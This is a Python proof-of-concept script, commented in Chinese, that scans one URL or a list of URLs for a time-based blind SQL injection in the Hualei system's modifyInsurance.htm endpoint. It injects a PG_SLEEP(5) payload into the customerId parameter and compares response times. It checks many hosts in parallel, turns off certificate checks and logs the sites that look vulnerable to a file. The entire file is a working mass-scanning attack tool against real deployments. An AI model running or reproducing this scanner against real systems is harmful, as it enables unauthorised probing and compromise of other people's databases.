import requests
import argparse
import sys
from multiprocessing.dummy import Pool
import warnings
from urllib.parse import urljoin
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 禁用SSL警告
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
ssl._create_default_https_context = ssl._create_unverified_context

def create_session():
    """创建配置好的请求会话"""
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    payload = "/modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5))"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': '*/*'
    }

    try:
        # 使用会话管理连接
        session = create_session()
        
        # 第一次请求获取基准响应时间
        re1 = session.get(url=target, headers=headers, timeout=5, verify=False)
        
        if re1.status_code != 200:
            print(f"[*]该网站{target}访问有问题，状态码: {re1.status_code}")
            return
            
        # 第二次请求带payload
        target_url = urljoin(target, payload)  # 使用urljoin正确处理URL拼接
        re2 = session.get(url=target_url, headers=headers, timeout=10, verify=False)
        
        # 计算时间差
        time_diff = re2.elapsed.total_seconds() - re1.elapsed.total_seconds()
        
        print(f"{target}: 基准时间={re1.elapsed.total_seconds():.2f}s, 攻击时间={re2.elapsed.total_seconds():.2f}s, 时间差={time_diff:.2f}s")
        
        # 简化时间判断逻辑
        if time_diff >= 4.5:  # 考虑到网络延迟，使用4.5秒作为阈值
            print(f"[+]该网站{target}可能存在SQL时间盲注漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f'华磊SQL注入漏洞: {target}\n')
        else:
            print(f"[-]该网站{target}未检测到SQL时间盲注漏洞")
            
    except requests.exceptions.Timeout:
        print(f"[*]该网站{target}请求超时")
    except requests.exceptions.ConnectionError:
        print(f"[*]该网站{target}连接错误")
    except requests.exceptions.RequestException as e:
        print(f"[*]该网站{target}请求异常: {str(e)}")
    except KeyboardInterrupt:
        raise  # 重新抛出KeyboardInterrupt，以便正确处理程序终止
    except Exception as e:
        print(f"[*]该网站{target}处理异常: {str(e)}")
    finally:
        if 'session' in locals():
            session.close()

def main():
    parser = argparse.ArgumentParser(description="华磊SQL注入漏洞检测工具 (时间盲注)")
    parser.add_argument('-u', '--url', type=str, dest='url', help='输入单个URL测试')
    parser.add_argument('-f', '--file', type=str, dest='file', help='输入URL文件批量测试')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        return
        
    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                url_list = [line.strip() for line in f if line.strip()]
                
            if not url_list:
                print("文件为空或没有有效的URL")
                return
                
            print(f"开始测试 {len(url_list)} 个URL")
            # 使用较小的线程数以避免过多请求
            with Pool(processes=20) as pool:
                pool.map(poc, url_list)
                
        except FileNotFoundError:
            print(f"错误: 文件 '{args.file}' 未找到")
        except Exception as e:
            print(f"处理文件时出错: {str(e)}")

if __name__ == '__main__':
    main()